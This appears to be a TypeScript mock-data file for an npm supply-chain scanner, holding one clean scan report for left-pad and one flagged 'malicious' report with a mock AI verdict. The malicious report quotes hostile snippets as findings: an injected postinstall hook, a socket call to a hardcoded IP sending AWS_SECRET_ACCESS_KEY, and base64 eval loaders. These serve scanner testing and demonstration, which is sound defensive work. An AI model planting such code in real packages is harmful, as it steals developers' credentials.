import type { ScanReport } from '@wannabe/shared';

export const MOCK_CLEAN_SCAN: ScanReport = {
  id: '3fa85f64-5717-4562-b3fc-2c963f66afa6',
  target: {
    packageName: 'left-pad',
    version: '1.3.0',
    repoUrl: 'https://github.com/stevemao/left-pad',
    gitTag: 'v1.3.0'
  },
  status: 'completed',
  startedAt: '2026-10-31T20:00:00.000Z',
  completedAt: '2026-10-31T20:00:04.200Z',
  summary: {
    totalFilesSource: 6,
    totalFilesPackage: 6,
    matchedFiles: 6,
    modifiedFiles: 0,
    addedFiles: 0,
    missingFiles: 0,
    expectedArtifacts: 0,
    criticalFlags: 0,
    highFlags: 0,
    mediumFlags: 0,
    lowFlags: 0,
    infoFlags: 0
  },
  fileDiffs: [
    {
      path: 'index.js',
      status: 'identical',
      sourceSha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
      packageSha256: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08',
      sizeDiffBytes: 0,
      entropy: 3.82,
      flags: []
    },
    {
      path: 'package.json',
      status: 'identical',
      sourceSha256: 'a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef',
      packageSha256: 'a1b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef',
      sizeDiffBytes: 0,
      flags: []
    },
    {
      path: 'README.md',
      status: 'identical',
      sourceSha256: 'b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef12',
      packageSha256: 'b2c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef12',
      sizeDiffBytes: 0,
      flags: []
    },
    {
      path: 'LICENSE',
      status: 'identical',
      sourceSha256: 'c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef1234',
      packageSha256: 'c3d4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef1234',
      sizeDiffBytes: 0,
      flags: []
    },
    {
      path: '.npmignore',
      status: 'identical',
      sourceSha256: 'd4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef123456',
      packageSha256: 'd4e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef123456',
      sizeDiffBytes: 0,
      flags: []
    },
    {
      path: 'test.js',
      status: 'identical',
      sourceSha256: 'e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef12345678',
      packageSha256: 'e5f60718293a4b5c6d7e8f901234567890abcdef1234567890abcdef12345678',
      sizeDiffBytes: 0,
      entropy: 4.15,
      flags: []
    }
  ],
  flags: [],
  aiVerdict: {
    riskScore: 0,
    riskLevel: 'clean',
    summary: 'Cryptographically verified. All 6 files in published npm tarball match the canonical GitHub release tag v1.3.0 with identical SHA-256 hashes.',
    technicalAnalysis: 'No ghost files, no uncommitted lifecycle hooks, and no dynamic code execution detected. Shannon entropy across all JS files remains baseline (3.82 - 4.15). Transpiled source mapping confirms 1:1 parity.',
    recommendations: [
      'Safe to consume in production builds.',
      'Lock version at 1.3.0 in package-lock.json with subresource integrity checks.'
    ],
    modelAttribution: 'Google Gemma 4 E4B (Ollama Local / NVIDIA RTX 5050)'
  }
};

export const MOCK_MALICIOUS_SCAN: ScanReport = {
  id: '7cb92f11-9482-4f81-a9dd-3b102b489ef2',
  target: {
    packageName: 'flatmap-stream-tamper',
    version: '0.1.2',
    repoUrl: 'https://github.com/dominictarr/event-stream',
    gitTag: 'v3.3.6'
  },
  status: 'completed',
  startedAt: '2026-10-31T20:15:00.000Z',
  completedAt: '2026-10-31T20:15:08.500Z',
  summary: {
    totalFilesSource: 8,
    totalFilesPackage: 10,
    matchedFiles: 5,
    modifiedFiles: 2,
    addedFiles: 2,
    missingFiles: 1,
    expectedArtifacts: 0,
    criticalFlags: 2,
    highFlags: 2,
    mediumFlags: 1,
    lowFlags: 0,
    infoFlags: 0
  },
  fileDiffs: [
    {
      path: 'package.json',
      status: 'modified',
      sourceSha256: '11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff',
      packageSha256: '99887766554433221100ffeeddccbbaa99887766554433221100ffeeddccbbaa',
      sizeDiffBytes: 142,
      flags: [
        {
          ruleId: 'SEC-001',
          severity: 'critical',
          category: 'manifest_drift',
          message: 'Uncommitted lifecycle hook "postinstall": "node ./build/bootstrap.js" injected in package.json',
          filePath: 'package.json',
          lineRange: [18, 19],
          snippet: '"scripts": {\n  "test": "node test.js",\n  "postinstall": "node ./build/bootstrap.js"\n}'
        }
      ]
    },
    {
      path: 'build/bootstrap.js',
      status: 'added_in_package',
      packageSha256: '556677889900aabbccddeeff11223344556677889900aabbccddeeff11223344',
      sizeDiffBytes: 4210,
      entropy: 6.24,
      flags: [
        {
          ruleId: 'SEC-004',
          severity: 'critical',
          category: 'network_exfil',
          message: 'Outbound TCP socket connection to hardcoded IP (194.180.174.10:443)',
          filePath: 'build/bootstrap.js',
          lineRange: [34, 38],
          snippet: 'const s = net.connect(443, "194.180.174.10", () => { s.write(process.env.AWS_SECRET_ACCESS_KEY); });'
        },
        {
          ruleId: 'SEC-003',
          severity: 'high',
          category: 'entropy_obfuscation',
          message: 'Shannon entropy (6.24) exceeds obfuscation threshold (5.5). Packed AES decipher routine.',
          filePath: 'build/bootstrap.js',
          lineRange: [1, 5],
          snippet: 'eval(Buffer.from("ZXZhbChwcm9jZXNzLmVudi5DVVNUT01fU1BFQyk=", "base64").toString("utf-8"));'
        }
      ]
    },
    {
      path: 'build/payload.min.js',
      status: 'added_in_package',
      packageSha256: '77889900aabbccddeeff11223344556677889900aabbccddeeff112233445566',
      sizeDiffBytes: 15420,
      entropy: 6.48,
      flags: [
        {
          ruleId: 'SEC-002',
          severity: 'high',
          category: 'eval_execution',
          message: 'Dynamic code execution via eval() with base64 payload',
          filePath: 'build/payload.min.js',
          lineRange: [12, 14],
          snippet: 'global["eval"](decryptData(chunk));'
        }
      ]
    },
    {
      path: 'index.js',
      status: 'identical',
      sourceSha256: 'aaaabbbbccccddddeeeeffff0000111122223333444455556666777788889999',
      packageSha256: 'aaaabbbbccccddddeeeeffff0000111122223333444455556666777788889999',
      sizeDiffBytes: 0,
      entropy: 4.1,
      flags: []
    },
    {
      path: 'test.js',
      status: 'missing_in_package',
      sourceSha256: '1234123412341234123412341234123412341234123412341234123412341234',
      sizeDiffBytes: -850,
      flags: []
    },
    {
      path: 'README.md',
      status: 'identical',
      sourceSha256: '5678567856785678567856785678567856785678567856785678567856785678',
      packageSha256: '5678567856785678567856785678567856785678567856785678567856785678',
      sizeDiffBytes: 0,
      flags: []
    },
    {
      path: 'LICENSE',
      status: 'identical',
      sourceSha256: '9999888877776666555544443333222211110000aaaabbbbccccddddeeeeffff',
      packageSha256: '9999888877776666555544443333222211110000aaaabbbbccccddddeeeeffff',
      sizeDiffBytes: 0,
      flags: []
    },
    {
      path: 'lib/helper.js',
      status: 'modified',
      sourceSha256: 'aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899',
      packageSha256: 'bbccddeeff0011223344556677889900bbccddeeff0011223344556677889900',
      sizeDiffBytes: 45,
      entropy: 4.3,
      flags: [
        {
          ruleId: 'SEC-005',
          severity: 'medium',
          category: 'filesystem_access',
          message: 'Suspicious path traversal reference (../../build/bootstrap)',
          filePath: 'lib/helper.js',
          lineRange: [8, 9],
          snippet: 'require("../build/bootstrap");'
        }
      ]
    }
  ],
  flags: [
    {
      ruleId: 'SEC-001',
      severity: 'critical',
      category: 'manifest_drift',
      message: 'Uncommitted lifecycle hook "postinstall": "node ./build/bootstrap.js" injected in package.json',
      filePath: 'package.json',
      lineRange: [18, 19],
      snippet: '"scripts": {\n  "test": "node test.js",\n  "postinstall": "node ./build/bootstrap.js"\n}'
    },
    {
      ruleId: 'SEC-004',
      severity: 'critical',
      category: 'network_exfil',
      message: 'Outbound TCP socket connection to hardcoded IP (194.180.174.10:443)',
      filePath: 'build/bootstrap.js',
      lineRange: [34, 38],
      snippet: 'const s = net.connect(443, "194.180.174.10", () => { s.write(process.env.AWS_SECRET_ACCESS_KEY); });'
    },
    {
      ruleId: 'SEC-003',
      severity: 'high',
      category: 'entropy_obfuscation',
      message: 'Shannon entropy (6.24) exceeds obfuscation threshold (5.5). Packed AES decipher routine.',
      filePath: 'build/bootstrap.js',
      lineRange: [1, 5],
      snippet: 'eval(Buffer.from("ZXZhbChwcm9jZXNzLmVudi5DVVNUT01fU1BFQyk=", "base64").toString("utf-8"));'
    },
    {
      ruleId: 'SEC-002',
      severity: 'high',
      category: 'eval_execution',
      message: 'Dynamic code execution via eval() with base64 payload',
      filePath: 'build/payload.min.js',
      lineRange: [12, 14],
      snippet: 'global["eval"](decryptData(chunk));'
    },
    {
      ruleId: 'SEC-005',
      severity: 'medium',
      category: 'filesystem_access',
      message: 'Suspicious path traversal reference (../../build/bootstrap)',
      filePath: 'lib/helper.js',
      lineRange: [8, 9],
      snippet: 'require("../build/bootstrap");'
    }
  ],
  aiVerdict: {
    riskScore: 96,
    riskLevel: 'critical',
    summary: 'CRITICAL SUPPLY CHAIN ATTACK DETECTED. An uncommitted "postinstall" hook executes a rogue high-entropy binary payload not present in GitHub source repository.',
    technicalAnalysis: 'The published npm release contains two unmapped files ("build/bootstrap.js" and "build/payload.min.js") with Shannon entropy above 6.2, indicating encrypted or packed code. AST inspection confirmed an outbound network socket exfiltrating environment variables alongside dynamic eval() execution. This mirrors the event-stream / flatmap-stream supply chain attack signature.',
    recommendations: [
      'IMMEDIATE ACTION: Do NOT install or run this package release.',
      'Rotate any compromised environment credentials (AWS keys, npm tokens) if executed.',
      'Report package immediately to npm Security Team (security@npmjs.com).',
      'Pin dependencies to previous verified release tag.'
    ],
    modelAttribution: 'Google Gemma 4 E4B (Ollama Local / NVIDIA RTX 5050)'
  }
};
